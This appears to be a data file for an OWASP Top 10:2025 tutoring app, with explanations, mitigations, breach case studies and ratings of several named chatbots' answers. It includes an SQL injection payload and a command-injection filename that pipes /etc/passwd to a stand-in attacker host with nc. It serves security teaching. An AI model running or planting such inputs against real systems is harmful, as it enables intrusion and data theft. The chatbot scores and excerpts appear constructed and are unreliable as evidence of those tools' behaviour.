// Master Data Store for AI OWASP Top 10 Tutor (OWASP Top 10:2025)

export const CATEGORIES = [
  {
    id: "A01:2025",
    sourceId: "SRC-001",
    name: "Broken Access Control",
    tagline: "Enforce permissions on server-side code, not cosmetic client buttons.",
    badge: "Authorization",
    color: "from-cyan-500 to-blue-600",
    url: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/",
    officialSummary: "Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits. Checks must be enforced on trusted server-side code.",
    beginner: {
      concept: "Think of an apartment building with 100 flats. When you enter the lobby, the security guard checks your name and lets you inside. But once you are on the 5th floor, every apartment door is left unlocked with no keyholes. Anyone who walks down the hall can open Apartment 502, 503, or 504. In web applications, Broken Access Control means the server checks if you are logged in, but fails to check whether you actually own the specific file, account, or record you are requesting.",
      analogy: "Apartment key card that accidentally unlocks every tenant's private bedroom door.",
      keyTakeaway: "Being logged in is not enough. The application must verify ownership on every single data query."
    },
    advanced: {
      mechanism: "Occurs when authorization checks are decoupled from object retrieval logic. Common vectors include Insecure Direct Object References (IDOR), path traversal, manipulating JSON parameters (e.g. changing user_id: 101 to 102), and missing method-level access controls on serverless/REST endpoints.",
      attackVector: "Attacker intercepts an API call `GET /api/documents/9924` and increments the ID to `9925` to view a competitor's confidential invoices.",
      mitigations: [
        "Enforce access control policies in trusted server-side code or serverless API gateways.",
        "Bind database lookups directly to the authenticated session context (e.g. `WHERE id = :id AND owner_id = :session_user_id`).",
        "Adopt Attribute-Based Access Control (ABAC) or Policy-as-Code (Open Policy Agent).",
        "Disable directory browsing and log all access control audit failures."
      ],
      cweReferences: ["CWE-200: Information Exposure", "CWE-639: IDOR", "CWE-284: Improper Access Control"]
    },
    caseStudies: [
      {
        id: "CS-A01-1",
        title: "Everyday Web App: Healthcare Patient Portal (IDOR)",
        badge: "Healthcare & PII",
        scenario: "A regional clinic portal allows patients to download their lab results at GET /api/patient/results?id=10492.",
        vulnerability: "The backend queries the database solely with the user-supplied id without verifying that the logged-in session owns that record. Anyone can increment the number to 10493 to view strangers' blood tests and medical histories.",
        impact: "Severe privacy violation, medical identity theft, and statutory HIPAA non-compliance penalties.",
        cleanFix: "Bind database lookups strictly to the authenticated user ID from the session cookie: SELECT * FROM results WHERE id = ? AND patient_id = session.user.id."
      },
      {
        id: "CS-A01-2",
        title: "Industry Breach: The Optus Telecom Customer Leak",
        badge: "Telecommunications",
        scenario: "In September 2022, Optus suffered an unauthorized API exfiltration affecting 9.8 million customer records.",
        vulnerability: "An unauthenticated testing API endpoint allowed external callers to request customer records by account ID without verifying identity tokens or authorization scopes.",
        impact: "Leakage of 9.8 million customer records containing passport numbers, driver's licenses, and phone numbers.",
        cleanFix: "Enforce zero-trust API gateway policies requiring valid cryptographic OAuth 2.0 bearer tokens on all internal and external endpoints."
      },
      {
        id: "CS-A01-3",
        title: "Cloud & API Architecture: Mass Assignment to Super-Admin",
        badge: "SaaS & REST API",
        scenario: "A multi-tenant SaaS profile update endpoint accepts JSON: PUT /api/user/profile with { name: 'Alice' }.",
        vulnerability: "The backend passes req.body straight into db.users.update(req.body). An attacker appends { role: 'super_admin' } to the request body.",
        impact: "A standard trial account instantly grants itself complete administrative control across all multi-tenant organizations.",
        cleanFix: "Use explicit Data Transfer Object (DTO) schema allowlisting to extract only permitted fields (e.g. name, avatar), ignoring elevated attributes."
      }
    ]
  },
  {
    id: "A02:2025",
    sourceId: "SRC-002",
    name: "Security Misconfiguration",
    tagline: "Harden default environments, disable debug traces, and automate config audits.",
    badge: "Configuration",
    color: "from-amber-500 to-orange-600",
    url: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/",
    officialSummary: "Occurs when security settings are defined, implemented, and maintained with default or improper values. Common examples include unnecessary enabled features, default accounts/passwords, overly detailed error messages with stack traces exposed, and missing security headers.",
    beginner: {
      concept: "Imagine buying a brand new home security alarm, but leaving the master PIN set to the factory default '1234' or taping the installation troubleshooting manual with internal wiring diagrams to your front door. Security Misconfiguration happens when developers deploy software with default sample settings, unclosed testing ports, or verbose error screens that tell strangers how the system is wired inside.",
      analogy: "Leaving the default factory admin password 'admin/admin' active on your internet router.",
      keyTakeaway: "Software is rarely secure out of the box. Every setting, error page, and network port must be hardened deliberately."
    },
    advanced: {
      mechanism: "Encompasses misconfigured cloud storage permissions (e.g. public Amazon S3 buckets), unhardened Docker/Kubernetes specs, enabled directory listings, default admin accounts, missing HTTP security headers (CSP, HSTS, X-Content-Type-Options), and detailed framework stack traces returned to the browser.",
      attackVector: "Triggering a 500 internal server error on an endpoint causes Express/Django to output the complete database connection string and file paths in the HTTP response.",
      mitigations: [
        "Automated deployment hardening pipelines that enforce zero-default credentials.",
        "Suppression of stack traces in production (`process.env.NODE_ENV === 'production'`).",
        "Strict Content Security Policy (CSP) and HTTP Strict Transport Security (HSTS) headers.",
        "Regular automated configuration drift scanning against CIS Benchmarks."
      ],
      cweReferences: ["CWE-16: Configuration", "CWE-209: Generation of Error Message Containing Sensitive Information", "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"]
    },
    caseStudies: [
      {
        id: "CS-A02-1",
        title: "Everyday Cloud App: Public Amazon S3 Bucket Exposure",
        badge: "Cloud Storage",
        scenario: "A ride-sharing startup uploads rider receipts, identity scans, and tax forms to an AWS S3 bucket.",
        vulnerability: "During initial development, an engineer set bucket permissions to 'Public Read' to speed up testing, but forgot to restrict permissions before production launch.",
        impact: "Over 600,000 identity records, bank statements, and personal addresses were indexed by search engines and leaked publicly.",
        cleanFix: "Enable AWS S3 'Block Public Access' across the organization root and use automated Infrastructure-as-Code linters (Checkov / tfsec) in CI/CD."
      },
      {
        id: "CS-A02-2",
        title: "Industry Breach: Capital One Cloud SSRF & Misconfiguration",
        badge: "Financial Sector",
        scenario: "In 2019, an attacker accessed over 100 million credit card applications stored in Capital One cloud instances.",
        vulnerability: "A misconfigured open-source Web Application Firewall on AWS EC2 had excessive IAM read permissions and allowed access to the EC2 metadata service.",
        impact: "Over 100 million customer records exfiltrated, leading to an $80 million regulatory penalty and extensive remediation.",
        cleanFix: "Enforce the Principle of Least Privilege on IAM roles, mandate IMDSv2 (session-token based metadata service), and isolate cloud workloads."
      },
      {
        id: "CS-A02-3",
        title: "Web Framework: Production Debugger & Stack Trace Leak",
        badge: "Web Framework",
        scenario: "A production e-commerce backend experiences an unexpected database deadlock during a promotional flash sale.",
        vulnerability: "The application ran with DEBUG=true or default framework error handlers, dumping an interactive stack trace with server paths and database connection strings into the browser.",
        impact: "External visitors and attackers viewed internal database credentials, server OS filenames, and secret keys used to sign sessions.",
        cleanFix: "Ensure NODE_ENV === 'production', suppress stack traces to end users, return a sanitized reference ID, and pipe technical diagnostics to private logs."
      }
    ]
  },
  {
    id: "A03:2025",
    sourceId: "SRC-003",
    name: "Software Supply Chain Failures",
    tagline: "Track direct & transitive packages, verify lockfiles, and monitor SBOMs continuously.",
    badge: "Supply Chain",
    color: "from-emerald-500 to-teal-600",
    url: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/",
    officialSummary: "Expanded in 2025 to encompass vulnerabilities introduced across the software development lifecycle, third-party libraries, compromised build pipelines, unvetted open-source components, and package repository poisoning. Emphasizes SBOM and integrity verification.",
    beginner: {
      concept: "When a bakery bakes bread, they don't grow the wheat or make the yeast themselves; they buy ingredients from flour mills and distributors. If a distributor's warehouse gets contaminated with poison, every loaf of bread baked that week becomes dangerous. In modern coding, developers rarely write 100% of their code; they import hundreds of open-source packages. A supply chain failure occurs when an imported component contains malware or flaws.",
      analogy: "A toy manufacturer using pre-made plastic wheels that contain toxic lead paint.",
      keyTakeaway: "Pinning version numbers alone is not enough; you must verify that the packages you import are vetted and free from tampering."
    },
    advanced: {
      mechanism: "Includes compromised upstream maintainer credentials, typosquatting packages on npm/PyPI, dependency confusion attacks, unreviewed transitive dependencies, untracked build-time scripts (`postinstall`), and missing cryptographic hash verification on downloaded artifacts.",
      attackVector: "An attacker acquires an abandoned npm package with 2 million weekly downloads and injects a subtle cryptocurrency wallet stealer into an innocent patch release.",
      mitigations: [
        "Maintain a continuous Software Bill of Materials (SBOM) using CycloneDX or SPDX standards.",
        "Lock dependency versions and enforce cryptographic hash validation (`npm ci` instead of `npm install`).",
        "Execute automated CI dependency vulnerability scans (`npm audit`, Snyk, Trivy) with build gates.",
        "Isolate build environments and disable untrusted post-install package execution hooks."
      ],
      cweReferences: ["CWE-1395: Dependency on Vulnerable Third-Party Component", "CWE-829: Inclusion of Functionality from Untrusted Sphere"]
    },
    caseStudies: [
      {
        id: "CS-A03-1",
        title: "Everyday Open Source: The Event-Stream Cryptocurrency Heist",
        badge: "Open Source NPM",
        scenario: "The popular open-source utility event-stream received almost 2 million weekly downloads from developer projects worldwide.",
        vulnerability: "The original maintainer transferred repository ownership to a volunteer who injected a malicious transitive dependency (flatmap-stream).",
        impact: "The malicious code targeted developers building Copay Bitcoin wallets, silently exfiltrating private wallet seed keys to an overseas server.",
        cleanFix: "Pin dependency versions in lockfiles, enforce hash verification with 'npm ci', and utilize automated supply chain security scanners (Socket.dev / Snyk)."
      },
      {
        id: "CS-A03-2",
        title: "Industry Breach: SolarWinds Orion Build Pipeline Poisoning",
        badge: "Enterprise IT",
        scenario: "SolarWinds Orion IT infrastructure management software was deployed across thousands of corporations and government agencies.",
        vulnerability: "Threat actors infiltrated the internal software build pipeline, inserting backdoor code into legitimate compiled updates before digital signing.",
        impact: "Over 18,000 organizations installed the tainted update, resulting in widespread global espionage and nation-state network compromises.",
        cleanFix: "Implement reproducible hermetic builds, air-gapped CI signing keys, continuous Software Bill of Materials (SBOM), and multi-party build reviews."
      },
      {
        id: "CS-A03-3",
        title: "Developer Ecosystem: Typosquatting on Package Registries",
        badge: "PyPI / NPM Registries",
        scenario: "A software team builds an automated data pipeline using the legitimate Python terminal library colorama.",
        vulnerability: "A developer made a typo and ran 'pip install collorama' (extra 'l'). A malicious actor had registered that exact misspelled package name.",
        impact: "Upon installation, the setup.py script executed a concealed reverse shell, compromising the developer's laptop and company network.",
        cleanFix: "Route all package installations through an internal enterprise proxy cache with curated allowlists, blocking unverified public packages."
      }
    ]
  },
  {
    id: "A04:2025",
    sourceId: "SRC-004",
    name: "Cryptographic Failures",
    tagline: "Use memory-hard adaptive hashing (Argon2id) and strong TLS 1.3 encryption.",
    badge: "Cryptography",
    color: "from-purple-500 to-indigo-600",
    url: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/",
    officialSummary: "Focuses on failures related to cryptography which often leads to sensitive data exposure. Weaknesses include using legacy ciphers (MD5, SHA1), plain text passwords without adaptive salting (Argon2id/bcrypt), poor entropy key generation, and flawed key lifecycle management.",
    beginner: {
      concept: "Imagine writing your personal banking password in a notebook using a secret code where 'A' becomes 'B' and 'B' becomes 'C'. A child with a pencil can crack that in seconds. In computing, Cryptographic Failures happen when an app fails to encrypt sensitive information, uses obsolete codes that computers can crack in milliseconds, or stores passwords in plain text where any rogue employee or hacker can read them immediately.",
      analogy: "Locking a bank vault with a cheap plastic suitcase padlock that opens with a paperclip.",
      keyTakeaway: "Never invent your own encryption, and never use fast algorithms like SHA-256 for passwords. Use memory-hard hashes like Argon2id."
    },
    advanced: {
      mechanism: "Stem from using legacy hashing functions (MD5, SHA-1) or general-purpose fast digests (SHA-256) for password storage, hardcoded symmetric keys, insufficient entropy in PRNGs, missing forward secrecy, or inadequate authenticated encryption modes (e.g. ECB mode instead of GCM).",
      attackVector: "Attacker obtains a database dump of user passwords hashed with plain SHA-256. Using consumer GPUs running Hashcat, they compute billions of hashes per second and recover 85% of user passwords within two hours.",
      mitigations: [
        "Store passwords strictly using adaptive, salted, memory-hard algorithms: Argon2id (primary recommendation) or bcrypt/scrypt.",
        "Encrypt all sensitive data in transit with TLS 1.3 and at rest with AES-256-GCM or ChaCha20-Poly1305.",
        "Use dedicated Hardware Security Modules (HSM) or cloud KMS for cryptographic key lifecycle governance.",
        "Ensure unique random salts of at least 16 bytes for every hashed credential."
      ],
      cweReferences: ["CWE-327: Use of a Broken or Risky Cryptographic Algorithm", "CWE-328: Reversible One-Way Hash", "CWE-916: Use of Password Hash With Insufficient Computational Effort"]
    },
    caseStudies: [
      {
        id: "CS-A04-1",
        title: "Everyday Web App: High-Speed GPU Cracking of SHA-256 Passwords",
        badge: "Authentication DB",
        scenario: "A web application hashes customer passwords using fast general-purpose SHA-256 without salt or memory-hardness.",
        vulnerability: "An attacker obtains a leaked database backup. Because SHA-256 executes in nanoseconds, commodity consumer GPUs compute billions of hashes per second.",
        impact: "Over 85% of customer passwords were recovered within hours using off-the-shelf wordlists and Hashcat rule-sets.",
        cleanFix: "Adopt memory-hard adaptive hashing algorithms: Argon2id (OWASP recommended) or bcrypt with tuned computational cost parameters."
      },
      {
        id: "CS-A04-2",
        title: "Industry Breach: Ashley Madison & Legacy MD5 Token Leaks",
        badge: "Legacy Algorithms",
        scenario: "In 2015, the Ashley Madison database containing 37 million user accounts was released publicly by hackers.",
        vulnerability: "Although bcrypt was used for login passwords, an internal token column still computed legacy MD5 hashes of user tokens using the same plaintext password.",
        impact: "Researchers were able to crack over 11 million user passwords in days due to the legacy, obsolete hashing function left in the database schema.",
        cleanFix: "Completely purge deprecated ciphers (MD5, SHA-1, DES) across all columns, session tokens, and legacy background sync routines."
      },
      {
        id: "CS-A04-3",
        title: "Client-Side Cryptography: Hardcoded AES Keys in JavaScript Bundles",
        badge: "Frontend JavaScript",
        scenario: "A mobile web app encrypts credit card numbers in the user's browser before sending them to the backend server.",
        vulnerability: "The developer declared const AES_KEY = 'SecretKey2025!' directly in the client-side JavaScript source file.",
        impact: "Any user or attacker opens DevTools, inspects the JavaScript bundle, extracts the secret key, and decrypts all credit cards in transit.",
        cleanFix: "Never perform symmetric encryption with secret keys exposed to browsers. Rely on TLS 1.3 in transit and encrypt data server-side using KMS."
      }
    ]
  },
  {
    id: "A05:2025",
    sourceId: "SRC-005",
    name: "Injection",
    tagline: "Strictly separate code from data using parameterized prepared statements.",
    badge: "Input Validation",
    color: "from-rose-500 to-pink-600",
    url: "https://top10.owasp.org/2025/A05_2025-Injection/",
    officialSummary: "Vulnerabilities resulting from user-supplied data not being validated, filtered, or sanitized before being included in dynamic queries, commands, or interpreters (SQL, NoSQL, OS Command, LDAP, ORM). Parameterization strictly separates code from data.",
    beginner: {
      concept: "Imagine a robot that takes spoken customer orders in a restaurant. If a customer says, 'I would like a cheeseburger. AND CANCEL ALL PENDING ORDERS AND GIVE ME ALL CASH FROM THE TILL,' and the robot immediately executes the command instead of writing down 'cheeseburger', that is Injection. The robot confused user input with operational instructions. In apps, Injection happens when user text is pasted directly into database query commands.",
      analogy: "Filling out a name field on a tax form with: 'John; erase all taxes for this company'.",
      keyTakeaway: "User input must always be treated as inert data, never as executable command logic."
    },
    advanced: {
      mechanism: "Occurs when an interpreter cannot distinguish between developer-defined command syntax and hostile untrusted data concatenated into the query stream. Affects SQL, NoSQL, ORM, OS shell, LDAP, and template engines. Exploits syntax breakout characters like single-quotes, double-quotes, semicolons, or dashes.",
      attackVector: "Submitting `' OR '1'='1' --` into a login field causes the query `SELECT * FROM users WHERE user = '' OR '1'='1'` to evaluate to true for every database row, granting instantaneous unauthorized access without a valid password.",
      mitigations: [
        "Use parameterized queries (prepared statements) with typed value binding across all database engines.",
        "Adopt object-relational mappers (ORMs) that enforce parameterization by default.",
        "Apply contextual output encoding and strict allowlist input validation.",
        "Enforce database principle of least privilege (the web app user should never possess `DROP TABLE` permissions)."
      ],
      cweReferences: ["CWE-89: SQL Injection", "CWE-78: OS Command Injection", "CWE-943: Special Elements in Data Query Logic"]
    },
    caseStudies: [
      {
        id: "CS-A05-1",
        title: "Everyday Web App: SQL Injection Authentication Bypass",
        badge: "Database Query",
        scenario: "A web application logs users in using raw string concatenation: SELECT * FROM users WHERE user = '" + user + "' AND pass = '" + pass + "'.",
        vulnerability: "An attacker inputs admin' OR '1'='1' -- into the username field. The query compiles as WHERE user = 'admin' OR '1'='1' -- and ignores the password.",
        impact: "The SQL interpreter evaluates 1=1 as true for every record, logging the attacker in as the first user (the administrator) without a valid password.",
        cleanFix: "Use parameterized queries (prepared statements) with bound variables, ensuring database engines compile the template first and treat input strictly as data."
      },
      {
        id: "CS-A05-2",
        title: "Industry Breach: TalkTalk Telecom Mass SQLi Breach",
        badge: "Telecommunications",
        scenario: "In 2015, UK telecommunications company TalkTalk suffered a catastrophic data breach compromising 157,000 customers.",
        vulnerability: "An unmaintained legacy website endpoint directly incorporated user URL parameters into internal SQL database queries without sanitation.",
        impact: "The company lost over 100,000 customers, was hit with a £400,000 regulatory fine, and suffered over £77 million in financial damage.",
        cleanFix: "Enforce strict ORM parameterized queries across all legacy and modern codebases, and run automated dynamic application security testing (DAST)."
      },
      {
        id: "CS-A05-3",
        title: "System Utilities: OS Command Injection via File Converter",
        badge: "Server Shell",
        scenario: "A document portal converts user images to PDF using a system shell command: exec('convert ' + filename + ' output.pdf').",
        vulnerability: "An attacker uploads a file named image.png; cat /etc/passwd | nc attacker.com 4444. The system shell executes the semicolon as a command separator.",
        impact: "The operating system executes the attacker's piped command with web server permissions, establishing an interactive reverse shell inside the datacenter.",
        cleanFix: "Never invoke operating system shell commands with user input. Use safe APIs like Node's execFile with explicit argument arrays, or native libraries."
      }
    ]
  },
  {
    id: "A07:2025",
    sourceId: "SRC-006",
    name: "Authentication Failures",
    tagline: "Enforce multi-factor auth, rate limiting, and constant-time credential checks.",
    badge: "Identity",
    color: "from-blue-600 to-cyan-700",
    url: "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/",
    officialSummary: "Confirmation of the user's identity, authentication, and session management are critical to protect against authentication-related attacks. Weaknesses include brute force susceptibility, credential stuffing, lack of MFA, insecure session token generation, and account enumeration.",
    beginner: {
      concept: "Imagine a bank where a teller lets someone try 50,000 different lock combinations on a safety deposit box with no delay, never alerts the police, and tells them, 'Nope, that username exists, try another password!' Authentication Failures happen when an app allows automated bots to guess millions of stolen passwords, fails to require a second security factor (like an authenticator app code), or issues weak session cookies that can be stolen or guessed.",
      analogy: "A front door lock that lets a thief try 1,000 keys a minute without setting off an alarm.",
      keyTakeaway: "Authentication requires more than just checking passwords; it requires limiting attempts, requiring MFA, and keeping sessions safe."
    },
    advanced: {
      mechanism: "Flaws permit credential stuffing, automated brute force, session hijacking, and account enumeration. Weaknesses include lacking rate limiters on `/login`, informative error messages ('Email does not exist' vs 'Incorrect password'), missing multi-factor authentication (MFA), predictable session IDs, and vulnerable password reset tokens.",
      attackVector: "An attacker loads 100,000 leaked credentials from a recent data breach into an automated script targeting an un-rate-limited `/api/login` endpoint, discovering 2,300 compromised accounts in under ten minutes.",
      mitigations: [
        "Enforce IP and account-level rate limiting with exponential backoff on authentication endpoints.",
        "Mandate Multi-Factor Authentication (MFA) utilizing FIDO2/WebAuthn or TOTP tokens.",
        "Return uniform error messages ('Invalid email or password') and use constant-time dummy hashing to eliminate account enumeration side-channels.",
        "Store session identifiers in cryptographically random, `HttpOnly`, `Secure`, `SameSite=Strict` cookies."
      ],
      cweReferences: ["CWE-287: Improper Authentication", "CWE-307: Improper Restriction of Excessive Authentication Attempts", "CWE-384: Session Fixation"]
    },
    caseStudies: [
      {
        id: "CS-A07-1",
        title: "Everyday Web App: Automated Credential Stuffing on Login APIs",
        badge: "Identity API",
        scenario: "A popular online store runs an authentication API endpoint at /api/v1/auth/login with no rate limiting or CAPTCHA.",
        vulnerability: "An attacker acquires 2 million email/password combos leaked from an external data breach and unleashes automated bots against the endpoint.",
        impact: "Because users reuse passwords across services, the attacker hijacked over 28,000 customer accounts, stealing stored balances and payment cards.",
        cleanFix: "Enforce IP and account-level rate limiting (e.g. max 5 attempts per 15 minutes), require Multi-Factor Authentication (MFA), and analyze bot telemetry."
      },
      {
        id: "CS-A07-2",
        title: "Industry Breach: 23andMe Credential Stuffing & Family Tree Scraping",
        badge: "Biotech & Genetic",
        scenario: "In 2023, genetic testing platform 23andMe suffered a massive unauthorized access incident impacting 6.9 million user profiles.",
        vulnerability: "Attackers executed automated credential stuffing against accounts with reused passwords, and scraped data from connected 'DNA Relatives' trees.",
        impact: "Millions of users had ancestry records and genetic health profiles exposed online, resulting in multiple class-action lawsuits.",
        cleanFix: "Mandate Multi-Factor Authentication (MFA) across all sensitive portals, block compromised password lists, and throttle automated credential guessing."
      },
      {
        id: "CS-A07-3",
        title: "Session Architecture: Session Fixation & Missing Token Regeneration",
        badge: "Session Management",
        scenario: "A financial portal assigns a session ID cookie SESSION_ID=pre_login_token to anonymous visitors reading the public homepage.",
        vulnerability: "When the user subsequently authenticates with valid credentials, the application preserves the exact same session cookie rather than issuing a new token.",
        impact: "An attacker who forced or trick-linked the victim to that pre-login cookie now holds the user's authenticated session without knowing their password.",
        cleanFix: "Always invalidate and regenerate session identifiers upon authentication (req.session.regenerate()), and enforce HttpOnly, Secure, SameSite=Strict."
      }
    ]
  }
];

export const AI_COMPARISONS = {
  "A01:2025": {
    "A-Basic": {
      prompt: "Explain A01:2025 Broken Access Control to a beginner and an advanced learner. Give a defensive example and prevention measures.",
      tools: {
        "ChatGPT (GPT-4o)": {
          rating: "B+",
          accuracyScore: "75%",
          groundingScore: "65%",
          summary: "Fluent explanation with a clear apartment building analogy, but introduced a subtle security fallacy by suggesting client-side UI button hiding for access protection.",
          hallucinations: ["Suggested hiding admin buttons in frontend as access control", "Cited superseded 2021 incidence statistics"],
          beginnerExcerpt: "Broken access control is when an app lets you see things you shouldn't. Imagine an apartment where your key opens your door, but also opens your neighbor's door if you turn the knob hard enough.",
          advancedExcerpt: "Occurs when authorization checks are missing on server endpoints or APIs. IDOR is the most common manifestation.",
          codeTip: "Insecure advice detected: 'Hide the admin button in React with {user.isAdmin && <AdminPanel />}' without emphasizing server-side auth."
        },
        "Gemini (Gemini 1.5 Pro)": {
          rating: "B",
          accuracyScore: "70%",
          groundingScore: "60%",
          summary: "Technically competent explanation, but overgeneralized CORS configuration as the primary defense against broken access control.",
          hallucinations: ["Overemphasized CORS as primary access control defense", "Omitted serverless API gateway authorization"],
          beginnerExcerpt: "Access control is like a bouncer at a club. Broken access control means the bouncer checks your ID at the front, but inside anyone can walk into the VIP lounge.",
          advancedExcerpt: "Attacks exploit missing server validations. CORS headers should be restricted to protect against cross-origin data theft.",
          codeTip: "Correctly provided Express middleware example, but lacked ownership constraint in database query."
        },
        "Claude (Claude 3.5 Sonnet)": {
          rating: "A-",
          accuracyScore: "85%",
          groundingScore: "75%",
          summary: "Strongest baseline output among basic prompts. Correctly distinguished authentication from authorization and warned against client-side trust.",
          hallucinations: ["Assumed OWASP 2021 rank instead of 2025 taxonomy"],
          beginnerExcerpt: "Access control decides what you are allowed to do. If a website lets you change the URL from profile?id=1 to profile?id=2 and view another user's private data, that is broken access control.",
          advancedExcerpt: "Enforcement must reside exclusively on trusted execution environments (server/serverless layers) with strict object-level validation.",
          codeTip: "Solid code pattern utilizing session ownership filtering."
        }
      }
    },
    "B-Evidence": {
      prompt: "Explain A01:2025 Broken Access Control using the supplied official OWASP 2025 source. Distinguish verified facts from assumptions, cite official passages, and provide a defensive code fix.",
      tools: {
        "ChatGPT (GPT-4o)": {
          rating: "A+",
          accuracyScore: "98%",
          groundingScore: "95%",
          summary: "Perfect alignment with official OWASP Top 10:2025 text. Completely eliminated client-side fallacies and provided a verifiable server-side authorization middleware.",
          hallucinations: ["None detected; claims mapped directly to source"],
          beginnerExcerpt: "Based on OWASP A01:2025: Access control enforces policy so users cannot act outside permitted boundaries. Analogy: An office badge that lets you enter the building, but the server must independently verify you are authorized for the accounting safe before unlocking it.",
          advancedExcerpt: "Per OWASP 2025 guidance, access checks must be enforced in trusted server-side code or APIs where attackers cannot modify checks or metadata. Defends against IDOR, URL tampering, and CORS misconfigurations.",
          codeTip: "Verified fix: Enforces `ownerId: req.user.id` on document lookup query and returns 404/403."
        },
        "Gemini (Gemini 1.5 Pro)": {
          rating: "A",
          accuracyScore: "95%",
          groundingScore: "92%",
          summary: "Drastic improvement over Strategy A. Successfully separated verifiable facts from framework-specific assumptions and added an explicit limitation note.",
          hallucinations: ["None; marked framework details as external assumptions"],
          beginnerExcerpt: "Official OWASP 2025 describes this as users acting beyond intended permissions. Think of a bank vault where having an account doesn't give you permission to open other customers' safety boxes.",
          advancedExcerpt: "Technical mechanism: Unvalidated request parameters mapped to database primary keys. Mitigated by server-side policy enforcement, least privilege, and disabling directory indexing.",
          codeTip: "Correctly implemented parameterized ownership query with session verification."
        },
        "Claude (Claude 3.5 Sonnet)": {
          rating: "A+",
          accuracyScore: "98%",
          groundingScore: "96%",
          summary: "Flawless structured response with dedicated claim ledger and self-check section identifying potential oversimplifications.",
          hallucinations: ["None; explicit uncertainty flags on non-OWASP statements"],
          beginnerExcerpt: "Directly grounded in official OWASP material: Access control ensures authenticated users can only access their authorized data. It is the core boundary separating user accounts.",
          advancedExcerpt: "OWASP Top 10:2025 emphasizes API-level authorization and serverless security boundaries. Fixes require record-level access control tokens and server-side ABAC validation.",
          codeTip: "Provided comprehensive Express + SQL parameterized code snippet with defense explanation."
        }
      }
    }
  },
  "A04:2025": {
    "A-Basic": {
      prompt: "Explain A04:2025 Cryptographic Failures to a beginner and an advanced learner. Provide a code example for storing passwords safely.",
      tools: {
        "ChatGPT (GPT-4o)": {
          rating: "C+",
          accuracyScore: "60%",
          groundingScore: "55%",
          summary: "Severe security error detected: recommended fast SHA-256 hashing without salt for password storage, which is trivially crackable with modern GPUs.",
          hallucinations: ["Recommended SHA-256 for passwords instead of adaptive hash", "Failed to mention Argon2id or memory hardness"],
          beginnerExcerpt: "Cryptographic failures happen when data isn't encrypted properly. Imagine writing your diary in a code where you just shift each letter by one.",
          advancedExcerpt: "Involves weak encryption algorithms, expired SSL certificates, and poor password storage. Use strong hashing like SHA-256.",
          codeTip: "CRITICAL FLAW: `hashlib.sha256(password.encode()).hexdigest()` recommended as a secure storage solution."
        },
        "Gemini (Gemini 1.5 Pro)": {
          rating: "B",
          accuracyScore: "75%",
          groundingScore: "65%",
          summary: "Recommended bcrypt (better than SHA-256), but failed to reference Argon2id or modern memory-hard requirements in the OWASP 2025 release.",
          hallucinations: ["Omitted Argon2id as the current primary recommendation"],
          beginnerExcerpt: "This risk means sensitive data like credit cards or passwords were not properly locked up using strong math.",
          advancedExcerpt: "Addresses data in transit and at rest. Encryption keys must be rotated and algorithms like DES or MD5 eliminated.",
          codeTip: "Used bcrypt with work factor 10. Acceptable, but did not discuss modern memory hardness."
        },
        "Claude (Claude 3.5 Sonnet)": {
          rating: "A-",
          accuracyScore: "85%",
          groundingScore: "80%",
          summary: "Accurately noted that passwords require adaptive hashing rather than fast cryptographic digests, recommending Argon2id.",
          hallucinations: ["Minor omission of post-quantum cryptography notes in 2025 draft"],
          beginnerExcerpt: "Cryptography is the science of secret codes. A failure means an app forgot to encrypt credit cards or used a code that computers can crack in seconds.",
          advancedExcerpt: "Distinguishes data in transit (TLS 1.3) from data at rest (AES-GCM). Passwords mandate memory-hard adaptive hashing.",
          codeTip: "Correctly demonstrated Argon2id password hashing."
        }
      }
    },
    "B-Evidence": {
      prompt: "Explain A04:2025 Cryptographic Failures using supplied OWASP 2025 text. Identify adaptive hashing algorithms, evidence citations, and why fast hashes fail.",
      tools: {
        "ChatGPT (GPT-4o)": {
          rating: "A+",
          accuracyScore: "97%",
          groundingScore: "95%",
          summary: "Completely corrected its Strategy A failure. Emphasized Argon2id, detailed why GPUs crack SHA-256 at billions of hashes/sec, and cited OWASP evidence.",
          hallucinations: ["None; fully corrected previous hashing vulnerability"],
          beginnerExcerpt: "OWASP A04:2025 establishes that passwords must never be stored in plain text or with simple fast hashes. Analogy: Storing a secret behind a lock that takes an hour to test each key, so hackers can't try billions of guesses.",
          advancedExcerpt: "Direct source citation: Modern password storage requires adaptive, memory-hard algorithms (Argon2id, scrypt, bcrypt). Fast digests like SHA-256 or MD5 are prohibited for passwords due to GPU acceleration.",
          codeTip: "Argon2id implementation with salt, time_cost=3, memory_cost=65536."
        },
        "Gemini (Gemini 1.5 Pro)": {
          rating: "A",
          accuracyScore: "94%",
          groundingScore: "92%",
          summary: "Accurately extracted the difference between data in transit vs data at rest and highlighted Argon2id parameters.",
          hallucinations: ["None"],
          beginnerExcerpt: "Based on OWASP: This failure exposes sensitive data because encryption was either missing or implemented with broken algorithms.",
          advancedExcerpt: "OWASP 2025 requires authenticated encryption (AES-256-GCM) and adaptive hashing. Cites prevention guidance on key lifecycle management.",
          codeTip: "Provided clean Python Argon2id implementation."
        },
        "Claude (Claude 3.5 Sonnet)": {
          rating: "A+",
          accuracyScore: "98%",
          groundingScore: "97%",
          summary: "Comprehensive, publication-grade analysis linking A04:2025 to NIST SP 800-63B and OWASP Password Storage Cheat Sheet.",
          hallucinations: ["None"],
          beginnerExcerpt: "OWASP Top 10:2025 classifies Cryptographic Failures as weaknesses in protecting sensitive data in storage and transmission.",
          advancedExcerpt: "Full architectural breakdown: Cryptographic PRNG entropy, key rotation policies, TLS 1.3 cipher suites, and Argon2id memory hardness.",
          codeTip: "Production-ready Argon2id password verification snippet with timing safety."
        }
      }
    }
  }
};

export const CLAIMS_DATA = [
  { id: "CLM-001", source: "A01:2025", tool: "ChatGPT", strategy: "A-Basic", level: "Beginner", claim: "Broken access control occurs when an application fails to check user permissions.", status: "Verified", evidence: "OWASP A01:2025 Definition: 'Users cannot act outside of their intended permissions.'", note: "Accurate beginner baseline." },
